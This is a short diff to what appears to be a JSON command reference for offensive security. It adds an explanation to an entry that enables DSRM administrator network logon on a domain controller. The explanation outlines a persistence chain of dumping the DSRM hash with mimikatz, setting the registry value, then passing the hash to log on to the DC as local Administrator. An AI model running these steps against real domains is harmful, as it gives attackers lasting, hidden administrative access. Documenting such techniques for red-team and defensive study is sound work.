@@ -125,5 +125,6 @@
       "label": "Enable DSRM logon behavior (reg add)",
       "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f"
     }
-  ]
+  ],
+  "explain": "Enables the DC's local DSRM administrator for network logon - a persistence account whose hash is not tied to AD password resets:\n  New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\'   the LSA key on the DC\n  -Name 'DsrmAdminLogonBehavior'   the value that governs DSRM logon\n  -Value 2                 allow the DSRM account to log on over the network\n  -PropertyType DWORD      registry value type\nDump the DSRM hash (lsadump::lsa /patch), set this, then pass-the-hash as the DC's local Administrator to that DC."
 }
